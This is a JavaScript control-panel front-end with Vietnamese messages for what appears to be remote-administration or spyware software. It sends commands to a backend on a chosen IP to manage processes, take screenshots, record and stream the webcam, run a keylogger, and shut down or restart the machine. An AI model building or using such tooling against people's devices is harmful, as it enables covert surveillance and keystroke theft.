/* -------------------------
   Globals & helpers
   ------------------------- */
let IP = "";            // current connected IP (string) or empty
let onWebcamImg = null; // img element for MJPEG or data URL
let localOnCamStream = null;
let localRecordChunks = [];

/* toast */
function showToast(text, type = "success"){
    const cont = document.getElementById("toast-container");
    const t = document.createElement("div");
    t.className = "toast " + (type === "success" ? "success" : "error");
    t.innerText = text;
    cont.appendChild(t);
    setTimeout(()=> { t.remove(); }, 5000);
}

/* top tabs */
document.querySelectorAll('.tab').forEach(btn => {
    btn.addEventListener('click', (ev) => {
        document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
        btn.classList.add('active');
        const target = btn.dataset.target;
        document.getElementById(target).classList.add('active');
    });
});

/* basic fetch wrapper */
async function postControl(payload){
    if(!IP) throw new Error("not-connected");
    const url = `http://${IP}:8080/control`;
    const res = await fetch(url, {
        method: "POST",
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(payload)
    });
    if(!res.ok) throw new Error("bad-response");
    return res.text();
}

/* -------------------------
   Connect / Disconnect
   ------------------------- */
document.getElementById('btnConnect').addEventListener('click', async ()=>{
    const ip = document.getElementById('ipInput').value.trim();
    if(!/^(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)$/.test(ip)){
        showToast("IP không hợp lệ", "error"); return;
    }
    try {
        // ping endpoint
        const pingRes = await fetch(`http://${ip}:8080/ping`, {method:'GET'});
        if(!pingRes.ok) throw new Error("ping failed");
        IP = ip;
        document.getElementById('connectStatus').innerText = `✔ Connected to ${IP}`;
        showToast("Kết nối thành công");
    } catch(e){
        IP = "";
        document.getElementById('connectStatus').innerText = `❌ Failed to connect to ${ip}`;
        showToast("Không thể kết nối backend trên " + ip, "error");
    }
});

document.getElementById('btnDisconnect').addEventListener('click', ()=>{
    IP = "";
    document.getElementById('connectStatus').innerText = `Disconnected`;
    showToast("Đã ngắt kết nối");
});

/* -------------------------
   Application commands
   ------------------------- */
async function handleListApp(){
    try {
        const txt = await postControl({command:'listApp'});
        document.getElementById('appList').innerText = txt;
    } catch(e){
        showToast("List app failed", "error");
    }
}
document.querySelector('[data-target="application"]').addEventListener('click', ()=>{}); // noop

window.sendCommand = async function(cmd){
    // Generic command sender used by buttons (keeps backwards compatibility)
    try {
        switch(cmd){
            case 'listApp': {
                const txt = await postControl({command:'listApp'});
                document.getElementById('appList').innerText = txt;
                showToast('List applications received');
                break;
            }
            case 'startApp': {
                const name = document.getElementById('appName').value.trim();
                if(!name){ showToast('Nhập tên app', 'error'); return; }
                const txt = await postControl({command:'startApp', name});
                showToast('Start app: ' + name);
                document.getElementById('appList').innerText = txt;
                break;
            }
            case 'stopApp': {
                const name = document.getElementById('appName').value.trim();
                if(!name){ showToast('Nhập tên app', 'error'); return; }
                const txt = await postControl({command:'stopApp', name});
                showToast('Stop app: ' + name);
                document.getElementById('appList').innerText = txt;
                break;
            }

            case 'listProcess': {
                const txt = await postControl({command:'listProcess'});
                document.getElementById('processList').innerText = txt;
                showToast('List processes received');
                break;
            }
            case 'startProcess': {
                const name = document.getElementById('processName').value.trim();
                if(!name){ showToast('Nhập tên process', 'error'); return; }
                const txt = await postControl({command:'startProcess', name});
                showToast('Start process: ' + name);
                document.getElementById('processList').innerText = txt;
                break;
            }
            case 'stopProcess': {
                const name = document.getElementById('processName').value.trim();
                if(!name){ showToast('Nhập tên process', 'error'); return; }
                const txt = await postControl({command:'stopProcess', name});
                showToast('Stop process: ' + name);
                document.getElementById('processList').innerText = txt;
                break;
            }

            case 'screenshot': {
                const txt = await postControl({command:'screenshot'});
                // Expect backend to return either a URL to image or a base64 data URL
                document.getElementById('screenshotResult').innerHTML = `<img src="${txt}" alt="screenshot">`;
                showToast('Screenshot received');
                break;
            }

            case 'recordWebcam': {
                const s = parseInt(document.getElementById('recSeconds').value || "0", 10);
                if(!s || s <= 0){ showToast('Nhập seconds > 0', 'error'); return; }
                const txt = await postControl({command:'recordWebcam', seconds:s});
                // backend should return location or message
                document.getElementById('recordResult').innerText = txt;
                showToast('Record completed');
                break;
            }

            case 'startKeylogger': {
                const txt = await postControl({command:'startKeylogger'});
                document.getElementById('keylogResult').innerText = txt;
                showToast('Keylogger started');
                break;
            }
            case 'stopKeylogger': {
                const txt = await postControl({command:'stopKeylogger'});
                document.getElementById('keylogResult').innerText = txt;
                showToast('Keylogger stopped');
                break;
            }
            case 'getKeylog': {
                const txt = await postControl({command:'getKeylog'});
                document.getElementById('keylogResult').innerText = txt;
                showToast('Keylog received');
                break;
            }

            case 'shutdown':
            case 'restart': {
                const txt = await postControl({command:cmd});
                showToast(`${cmd} command sent`);
                break;
            }

            default:
                showToast('Unknown command: ' + cmd, 'error');
        }
    } catch(err){
        if(err.message === 'not-connected'){
            showToast('Chưa kết nối IP', 'error');
        } else {
            showToast('Lỗi khi gởi lệnh: ' + (err.message||err), 'error');
        }
    }
};

/* -------------------------
   OnWebcam (live view)
   Strategy:
    - If backend provides MJPEG at http://IP:8080/camera, use <img src="...">
    - Otherwise fallback to local getUserMedia demo
   ------------------------- */
function startOnWebcam(){
    if(!IP){
        // local demo
        startLocalOnCam();
        return;
    }
    const mjpegURL = `http://${IP}:8080/camera`;
    // Test fetch to see if MJPEG endpoint exists
    fetch(mjpegURL, {method:'HEAD'}).then(res=>{
        if(res.ok){
            // insert <img> that points to MJPEG stream
            const c = document.getElementById('onWebcamContainer');
            c.innerHTML = `<img id="mjpegStream" src="${mjpegURL}" alt="camera stream">`;
            showToast('Using backend MJPEG stream');
        } else {
            // fallback to local
            startLocalOnCam();
        }
    }).catch(()=> startLocalOnCam());
}

function stopOnWebcam(){
    // remove MJPEG image if present
    const img = document.getElementById('mjpegStream');
    if(img) img.remove();
    // stop local stream if any
    if(localOnCamStream){
        localOnCamStream.getTracks().forEach(t=>t.stop());
        localOnCamStream = null;
        const c = document.getElementById('onWebcamContainer');
        c.innerHTML = '';
    }
}

async function startLocalOnCam(){
    try{
        localOnCamStream = await navigator.mediaDevices.getUserMedia({video:true});
        const c = document.getElementById('onWebcamContainer');
        c.innerHTML = `<video id="localOnCam" autoplay playsinline></video>`;
        document.getElementById('localOnCam').srcObject = localOnCamStream;
        showToast('Local camera activated (demo)');
    } catch(e){
        showToast('Không thể mở camera local', 'error');
    }
}

/* -------------------------
   Local webcam record demo (in-browser)
   ------------------------- */
async function localRecordDemo(){
    try{
        const s = parseInt(document.getElementById('recSeconds').value || "0", 10);
        if(!s || s <= 0){ showToast('Nhập seconds > 0', 'error'); return; }

        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();

        showToast(`Recording local ${s}s...`);
        await new Promise(r => setTimeout(r, s*1000));
        recorder.stop();

        await new Promise(resolve => recorder.onstop = resolve);
        stream.getTracks().forEach(t=>t.stop());

        const blob = new Blob(chunks, {type:'video/webm'});
        const url = URL.createObjectURL(blob);
        document.getElementById('recordResult').innerHTML = `<a href="${url}" download="record.webm">Download local recording</a>`;
        showToast('Local record ready');
    } catch(e){
        showToast('Local record failed', 'error');
    }
}

/* -------------------------
   Local screenshot demo
   ------------------------- */
function localScreenshotDemo(){
    // just a placeholder image (can't screenshot other window from browser)
    document.getElementById('screenshotResult').innerHTML = `<img src="https://via.placeholder.com/800x450?text=Screenshot+Demo">`;
    showToast('Local screenshot demo shown');
}

/* -------------------------
   local demo keylogger (only records keys pressed in browser)
   ------------------------- */
let demoKeylog = "";
let demoLogging = false;
function startLocalKeyloggerDemo(){
    demoLogging = true;
    demoKeylog = "";
    showToast('Local keylogger started (demo)');
    window.addEventListener('keydown', demoKeyListener);
}
function stopLocalKeyloggerDemo(){
    demoLogging = false;
    window.removeEventListener('keydown', demoKeyListener);
    showToast('Local keylogger stopped (demo)');
}
function demoKeyListener(e){
    demoKeylog += e.key + " ";
    document.getElementById('keylogResult').innerText = demoKeylog;
}

function startKeylogger(){ // called by button (attempt remote, fallback to local demo)
    if(!IP){ startLocalKeyloggerDemo(); return; }
    sendCommand('startKeylogger');
}
function stopKeylogger(){
    if(!IP){ stopLocalKeyloggerDemo(); return; }
    sendCommand('stopKeylogger');
}

/* -------------------------
   Convenience: wire some UI buttons to legacy sendCommand calls
   (these are inline onclick in HTML using sendCommand)
   ------------------------- */

// the HTML calls sendCommand(...) directly

/* End of script */
